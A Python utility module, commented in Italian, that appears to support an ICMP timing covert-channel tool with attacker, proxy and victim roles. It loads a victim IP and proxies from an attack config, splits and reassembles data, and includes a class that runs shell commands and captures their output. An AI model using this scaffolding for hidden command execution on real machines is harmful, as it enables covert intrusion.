import string 
import argparse 
import sys
import subprocess
import threading 
import os
import time 
import ctypes 
import json
from custom_enum import MSG, ENTITY, ATTACK_TYPE, SEPARAZIONE_DATI
from check_type import * 
from get_type import *
from network_methods import IP 
from thread_methods import PROXIES_CONECTION, WAIT_DATA

exit_cases=["exit","quit",MSG.END_COMMUNICATION.value] 

systemsDictionary={
    'aix':"AIX",
    'android':"Android",
    'emscripten':"Emscripten",
    'ios':"iOS", 
    'linux':"Linux", 
    'darwin':"macOS", 
    'win32':"Windows", 
    'cygwin':"Windows/Cygwin", 
    'wasi':"WASI" 
} 

def non_blocking_sleep(secondi:int=None): 
    if not is_integer(secondi) or secondi<0:
        raise Exception("aspetta_tempo: Argomenti non validi") 
    if secondi>=60: 
        print(f"Attesa di {secondi//60} minuti e {secondi%60} secondi in corso...")
    else:
        print(f"Attesa di {secondi} secondi in corso...")
    while secondi>0:
        time.sleep(1)
        secondi-=1  

class POWER_SLEEP: 
    #On Window syou can use the WIn32 API via ctypes to set an execution state that keeps the system awake
    class WINDOWS: 
        keep_preventing_sleep=True
        duration_time:int=None 
        # Constants from Win32 API
        ES_AWAYMODE_REQUIRED = 0x00000040
        ES_CONTINUOUS = 0x80000000
        ES_DISPLAY_REQUIRED = 0x00000002
        ES_SYSTEM_REQUIRED = 0x00000001 

        def __init__(self, duration_time:int=None): 
            if not is_integer(duration_time):
                raise TypeError("duration_time non intero")
            # Load kernel32 DLL
            self.kernel32 = ctypes.windll.kernel32 
            self.duration_time=duration_time

        def prevent_sleep(self):
            #Prevents system from sleeping using Windows API  
            print("PREVENT SLEEP")
            self.kernel32.SetThreadExecutionState(
                self.ES_CONTINUOUS | self.ES_SYSTEM_REQUIRED | self.ES_DISPLAY_REQUIRED
            )

        def allow_sleep(self):
            #Restores normal sleep behavior. 
            print("ALLOW SLEEP")
            self.kernel32.SetThreadExecutionState(self.ES_CONTINUOUS)
        
        def run(self):
            try: 
                print("Preventing sleep... Press Ctrl+C to stop.")
                self.prevent_sleep() 
                keep_preventing_sleep=True
                #start_time=time.time() 
                #if duration_time is None: 
                #    exit
                # Simulate long-running low-performance task
                while keep_preventing_sleep:
                    time.sleep(1)  # Sleep to keep CPU usage low
            except KeyboardInterrupt:
                print("\nRestoring normal sleep settings...")
            finally: 
                self.allow_sleep() 
    class LINUX: 
        cmd='systemd-inhibit --what=sleep --why="Timing covert channel" python3 your_script.py'

        def run_with_inhibit():
            cmd = [
                "systemd-inhibit",
                "--what=sleep",
                "--why=Timing covert channel",
                "--mode=block",
                sys.executable,
                *sys.argv
            ]
            os.execvp(cmd[0], cmd)
    class MACOS: 
        cmd='caffeinate -dimsu python3 your_script.py' 

        def run(): 
            subprocess.Popen(["caffeinate", "-dimsu"])

def sanitize_str(stringa):
    if type(stringa) is not str or string is None:
        raise Exception("Stringa non valida")
    stringa = ''.join(
        char if char in string.printable 
        else'' 
        for char in stringa
    ) 
    #stringa=stringa.replace("\t","")
    #stringa=stringa.replace("\n","")
    return stringa.strip() 

def print_dictionary(dictionary:dict=None):
    if not isinstance(dictionary,dict):
        raise Exception("print_dictionary: Dizionario passato non valido") 
    elif len(dictionary)<=0:
        print("Il dizionario è vuoto")
        return
    print("Valori presenti:")
    for key, value in dictionary.items():
        print(f"\t{key}\t\t{value}") 

def ask_bool_choice(msg:str):
    def is_scelta_SI_NO(scelta:str=None):
        if not is_string(scelta): 
            return False 
        whitebox=["yes","si","yeah"]
        for x in whitebox:
            if sanitize_str(scelta)!="" and (x.startswith(scelta) or x in scelta):
                return True 
        return False
    if not isinstance(msg, str):
        raise Exception("ask_bool_choice: Il messaggio non è una stringa")
    return is_scelta_SI_NO(input(f"{msg}"))

class PARSER: 
    def add_argument(param_arg, parser=None):
        if parser is None:
            raise Exception("Parser nullo")
        if len(param_arg)!=3:
            raise Exception("Numero di parametri non corretto")
        if type(param_arg[0]) is not str: 
            raise Exception("L'argomento non è una stringa")
        if type(param_arg[2]) is not str: 
            raise Exception("Il messaggio di aiuto non è una stringa")
        if not (param_arg[0].startswith("--") or param_arg[0].startswith("-")):
            raise Exception("L'argomento deve iniziare con - oppure con --")
        return parser.add_argument(param_arg[0],type=param_arg[1], help=param_arg[2])

    def print_supported_arguments(parser:argparse.ArgumentParser=None): 
        if is_ArgumentParser(parser): 
            print("Controlla di inserire due volte - per gli argomenti")
            print("Argomenti supportati:") 
            for action in parser._actions:
                print("\t{arg}: {help}".format(
                    arg=action.option_strings[0],
                    help=action.help
                )) 

    def check_arguments(parser: argparse.ArgumentParser=None): 
        if is_ArgumentParser(parser):  
            args, unknown = parser.parse_known_args() 
            return args, unknown 
        return None, None

class CALC: 
    def checksum(data: bytes) -> int:
        """
        Calculate the Internet checksum for the given data.
        
        :param data: The data to calculate the checksum for (as bytes).
        :return: The checksum as an integer.
        """
        checksum = 0 
        # Handle odd-length data
        if len(data) % 2 != 0:
            data += b"\x00"
        # Process the data in 16-bit chunks 
        for i in range(0, len(data), 2):
            # Combine two bytes into one 16-bit word
            word = data[i] << 8
            if i + 1 < len(data):
                word += data[i + 1]
            checksum += word
            # Handle overflow by adding the carry
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        # One's complement of the result
        checksum = ~checksum & 0xFFFF
        print(f"The checksum of\n\t{data}\n\tis\n\t{checksum}") 
        return checksum 
    
    def checksumV2(data):
        checksum = 0 
        # Handle odd-length data
        if len(data) % 2 != 0:
            data += b"\x00" 
        # Calculate checksum
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i+1] 
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += checksum >> 16 
        return (~checksum) & 0xffff

class TIMER: 
    def stop(timer:threading.Timer=None): 
        if is_threading_Timer(timer): 
            if timer.is_alive(): 
                print("Fermo il timer",end="  ")
                timer.cancel()  
                print(f"Timer fermato? {timer.is_alive()}")
                if not timer.is_alive(): 
                    print("Timer fermato correttamente")
                    return True
                print("Timer ancora in esecuzione")
            else: 
                print("Il timer non era in esecuzione") 
            return False 
        raise Exception(f"Timer non istanza di threadig.Timer: {type(timer)}") 

class ARGS_CONFIG:
    class FROM_FILE: 
        default_file_path:str="./attack_file.json" 

        def __init__(self, file_path:str=None): 
            self.config_file=None 
            if is_string(file_path) and file_path.endswith(".json"): 
                try: 
                    self.config_file=ARGS_CONFIG.FROM_FILE.load_file(file_path) 
                    pass
                except Exception as e: 
                    print(e) 
            if not self.config_file:
                self.config_file=ARGS_CONFIG.FROM_FILE.load_file(self.default_file_path) 
        
        def load_file(path_of_file:str):
            if not is_string(path_of_file): 
                raise TypeError(f"File path {path_of_file} non valido") 
            if not os.path.exists(path_of_file): 
                raise FileNotFoundError(f"File {path_of_file} non presente")
            if not str(path_of_file).endswith(".json"): 
                raise TypeError(f"File {path_of_file} non JSON file") 
            with open(path_of_file, 'r') as file: 
                print(f"File di configurazione {path_of_file} caricato correttamente") 
                return json.load(file) 
        
        def get_vittima(self): 
            try:
                ip_vittima=self.config_file.get("ip_vittima", None) 
                return ipaddress.ip_address(ip_vittima) 
            except Exception as e:
                print(f"get_vittima: {e}") 
                return None 
        
        def get_proxy_list(self):  
            proxy_list:list[ipaddress._IPAddressBase]=[]
            for ip_proxy in self.config_file.get("proxy_list", []): 
                try:
                    proxy_ip=ipaddress.ip_address(ip_proxy)
                    proxy_list.append(proxy_ip) 
                except Exception as e:
                    print(f"get_proxy_list: {e}") 
            return proxy_list if len(proxy_list)>0 else None 
        
        def get_attacco(self): 
            attack_type=ATTACK_TYPE.get_attack_method(self.config_file.get("attack_function")) 
            for count in range(3):
                if is_enum_member(attack_type,ATTACK_TYPE): 
                    return attack_type 
                attack_type=ATTACK_TYPE.choose_attack_function() 
            #raise TypeError("Attacco non valido:",attack_type) 
            return None 
        
        def get_ip_host(self): 
            ip_host, errore=IP.find_local_IP() 
            if errore:
                print("errore:",errore)  
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                ip_host=input(msg) 
            #self.ip_host=ipaddress.ip_address("192.168.56.104") #TODO eliminare alla fine 
            for count in range(3):
                try:
                    ip_host=ipaddress.ip_address(ip_host) 
                    return ip_host
                except Exception as e:
                    print(f"get_ip_host: {e}") 
                    print("Indirizzo IP dell'host non valido") 
                    msg="Inserire indirizzo IP dell'host:\n\t#" 
                    ip_host=input(msg) 
            return None 
        
        def get_proxy_port(self): 
            proxy_port=int(self.config_file.get("proxy_port", None) )
            for count in range(3):
                if is_integer(proxy_port) and 0<proxy_port<65536: 
                    return proxy_port 
                print("Porta proxy non valida")
                msg="Inserire porta proxy (0-65535):\n\t#"
                proxy_port=int(input(msg)) 
            return None
        
        def get_num_proxy(self): 
            num_proxy=int(self.config_file.get("num_proxy", None) )
            for count in range(3):
                if is_integer(num_proxy) and 0<num_proxy<100: 
                    return num_proxy 
                print("Numero proxy non valido")
                msg="Inserire numero proxy (1-100):\n\t#"
                num_proxy=int(input(msg)) 
            return None
        
    class FROM_COMMAND:
        def __init__(self, entita:ENTITY=None): 
            def _attaccante()->argparse.Namespace: 
                parser.add_argument("--file_path",type=str, help="File di configurazione")  
                args,unknown =PARSER.check_arguments(parser) 
                if not is_namespace(args) or not is_list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                if not args.file_path or not is_string(args.file_path): 
                    raise ValueError(f"--file_path non specificato") 
                return args  
            def _proxy()->argparse.Namespace: 
                parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante") 
                args,unknown =PARSER.check_arguments(parser) 
                if not is_namespace(args) or not is_list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                if not args.ip_attaccante or not is_string(args.ip_attaccante): 
                    raise ValueError(f"--ip_attaccante non specificato") 
                return args  
            def _victim()->argparse.Namespace:  
                parser.add_argument("--num_proxy",type=int, help="Numero dei proxy necessari")
                args,unknown =PARSER.check_arguments(parser) 
                if not is_namespace(args) or not is_list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                if not args.num_proxy or not is_integer(args.num_proxy): 
                    raise ValueError(f"--num_proxy non specificato") 
                return args  
            #---------------------
            if not is_enum_member(entita, ENTITY): 
                raise TypeError(f"Entità {entita} non valida") 
            #self.entita=entita 
            parser = argparse.ArgumentParser() 
            try:
                if entita==ENTITY.ATTACKER: 
                    self.args=_attaccante() 
                elif entita==ENTITY.VICTIM: 
                    self.args=_victim()
                elif entita==ENTITY.PROXY: 
                    self.args=_proxy() 
                else: raise ValueError("Entita non valida:",entita)
            except ValueError as e:
                print(e) 
                #parser.print_help() 
                PARSER.print_supported_arguments(parser) 
                self.args=None 


class DATA: 
    class PROXY: 
        def __init__(self, proxy:ipaddress._IPAddressBase, proxy_port:int=None): 
            if not is_ipaddress(proxy): 
                raise TypeError("proxy non valido") 
            if not is_integer(proxy_port) or not 1023<proxy_port<65536: 
                raise ValueError("proxy_port non valido")
            self.ipaddress:ipaddress.IPv4Address=proxy 
            self.port=proxy_port
            self.socket:socket.socket=None 
            self.event:threading.Event=get_threading_Event() 
            self.data_received:list[str]=[] 
            self.data_lock=get_threading_Lock() 
    
    class METHODS: 
        def invia_dati(type_separazione:Enum): 
            def by_id(): 
                print("Invio dati seprandoli by ID") 
            #-------------------
            if not is_enum_member(type_separazione, SEPARAZIONE_DATI): 
                raise TypeError("Tipologia separazione dati non vlaida")
            if type_separazione.value==SEPARAZIONE_DATI.ID.value: 
                by_id() 

        def separa_dati(type_separazione:Enum, data_received:dict[str,list]): 
            def by_id(): 
                print("Invio dati seprandoli by ID") 
                dati_separati:dict[str,list]=[]
                unindent_data=[]
                ## dati_separati={id:lista}
                for list_data in data_received.values(): 
                    if isinstance(list_data, bytes):
                            list_data=list_data.decode()
                    else: print(type(data))
                    for data in list_data.split("||"): 
                        unindent_data.append([x for x in data])
                #print("unindent_data: ",unindent_data)    
                for list_data in unindent_data:
                    #print("list_data: ",list_data)
                    #print(f"\t***{list_data}")
                    if isinstance(list_data, bytes):
                            list_data=list_data.decode()
                    else: print(type(data))
                    list_data=list_data.split("&&")
                    if len(list_data)!=2:
                        print(f"Errore. Length is {len(list_data)}\t{list_data}")
                        continue
                    if dati_separati.get(list_data[0]) is None:
                        dati_separati.update({list_data[0]:[]}) 
                    dati_separati.get(list_data[0]).append(list_data[1]) 
                return dati_separati 
            def old_by_id(dati_separati:dict[str,list]): 
                unindent_data=[]
                ## dati_separati={id:lista}
                for list_data in data_received.values():
                    for data in list_data:
                        if isinstance(data, bytes):
                            data=data.decode()
                        if isinstance(data, str):
                            data=data.split("||")
                        else: print(type(data))
                        #print("Separa: ",data) 
                        unindent_data.append([x for x in data])
                #print("unindent_data: ",unindent_data)    
                for list_data in unindent_data:
                    #print("list_data: ",list_data)
                    #print(f"\t***{list_data}")
                    for index in range(len(list_data)):
                        #print(f"AAAA: {index}/{len(list_data)}")
                        if not list_data[index]: 
                            continue
                        #print(f"\t***{list_data[index]}") 
                        if isinstance(list_data[index],bytes):
                            data=list_data[index].decode()
                        if isinstance(list_data[index],str): 
                            data=list_data[index].split("\t")
                        #print("***DATA: ",data) 
                        if dati_separati.get(data[1]) is None:
                            dati_separati.update({data[1]:[]}) 
                        dati_separati.get(data[1]).append(data)
            #-------------------
            if not is_enum_member(type_separazione, SEPARAZIONE_DATI): 
                raise TypeError("Tipologia separazione dati non vlaida")
            if type_separazione.value==SEPARAZIONE_DATI.ID.value: 
                by_id() 
            
        def unisci_dati(dati_separati:dict[str:list]):
            payload=[] 
            for index in range(len(dati_separati)): 
                #print("DATI: ",dati_separati.get(str(index))) 
                for data in dati_separati.get(str(index)):
                    if data[2]==MSG.LAST_PACKET.value:
                        continue
                    payload.append(data[2])
            return payload

class ICMP_THREAD: 
    thread_lock=None 
    thread_response={} 
    thread_list={} 

    def __init__(self, proxy_list:list[ipaddress._IPAddressBase], callback_function):  
        if not is_list(proxy_list) or len(proxy_list)<=0: 
            raise TypeError("proxy_list non valida") 
        if any(not is_ipaddress(ip) for ip in proxy_list): 
            raise ValueError("proxy_list non valida") 
        if not is_callable_function(callback_function): 
            raise TypeError("callback_function not callable")
        self.thread_lock=get_threading_Lock() 
        for proxy in proxy_list: 
            if not is_ipaddress(proxy): 
                print(f"***\t{proxy} non è un indirizzo valido")
                continue 
            thread=threading.Thread(
                target=callback_function, 
                args=[proxy]
            ) 
            thread.name=f"Thread-{proxy.compressed}" 
            self.thread_list[proxy.compressed]=thread 
            self.thread_response[proxy.compressed]=False 
        print("Definito il dizionario dei thread") 
        print("Definiti il dizionario delle risposte") 
    
    def reset(self): 
        if not is_dictionary(self.thread_list) or len(self.thread_list)<=0: 
            raise TypeError("thread_list non valido")  
        for thread in self.thread_list.values():
            thread.clear() 
        print("Thread ICMP reimpostati") 

    def start(self): 
        if not is_dictionary(self.thread_list) or len(self.thread_list)<=0: 
            raise TypeError("thread_list non valido")  
        self.reset()
        for thread in self.thread_list.values():
            thread.start() 
        print("Thread ICMP avviati")
    
    def wait(self):  
        if not is_dictionary(self.thread_list) or len(self.thread_list)<=0: 
            raise TypeError("thread_list non valido")  
        for thread in self.thread_list.values():
            #thread.wait()  
            thread.join()  
        print("Thread ICMP terminati") 


class EXCEUTE_COMMAND: 
    def __init__(self, comando:str=None): 
        def check_system_compatibility():
            supportedSystems=["linux","win32"] 
            if sys.platform not in supportedSystems: 
                print(sys.platform," non supportato")
                return False 
            return True     
        def append_END_DATA(command:str=None):
            if not is_string(command):
                raise ValueError("comando non stringa",comando) 
            if sys.platform=="win32":
                command+=f" && echo '{MSG.END_DATA.value}'"
            elif sys.platform=="linux": 
                command+=f"; echo '{MSG.END_DATA.value}'" 
            else: print("Sistema operativo non supportato.") 
            print("END append_END_DATA->",command) 
            return command
        def read_stream(stream, data_list:list=None):  
            if not is_list(data_list): 
                raise TypeError("data_list non valida")
            for line in iter(stream.readline, ''):
                if line:
                    decoded = line.rstrip()
                    #print(f"{label}: {decoded}")
                    data_list.append(decoded)
            stream.close() 
        #---------------------
        print("Sistema supportato...") 
        if not is_string(comando): 
            raise ValueError("comando non stringa",comando) 
        if not check_system_compatibility(): 
            raise SystemError(f"{sys.platform} non supportato...") 
        #comando=append_END_DATA(comando)  
        process_shell=get_shellProcess_command(comando) 
        if not is_subprocess_Popen(process_shell): 
            raise Exception("shell non valida:",type(process_shell)) 
        if not process_shell.stdout: 
            raise Exception("stdout non valido") 
        if not process_shell.stderr: 
            raise Exception("stdout non valido") 
        print("Shell aperta con successo...") 
        data_stdout=[] 
        thread_stdout = threading.Thread(
            target=read_stream, 
            args=(process_shell.stdout, data_stdout),
            daemon=True
        ) 
        thread_stdout.start() 

        data_stderr=[] 
        thread_stderr = threading.Thread(
            target=read_stream, 
            args=(process_shell.stderr, data_stderr), 
            daemon=True
        ) 
        thread_stderr.start() 
        
        process_shell.wait()
        process_shell.terminate() 
        thread_stdout.join()
        thread_stderr.join() 
        print("Comando eseguito") 
        #print("STDOUT",data_stdout) 
        data:str=""
        if is_list(data_stdout) and len(data_stdout)>0: 
            data+="".join(text for text in data_stdout) 
        #print("STDEERR",data_stderr) 
        if is_list(data_stderr) and len(data_stderr)>0: 
            data+="".join(text for text in data_stderr) 
        #print("DATI ESECUZIONE",data) 
        self.data=data.strip()
        #if self.data=="": 
        #    self.data=None





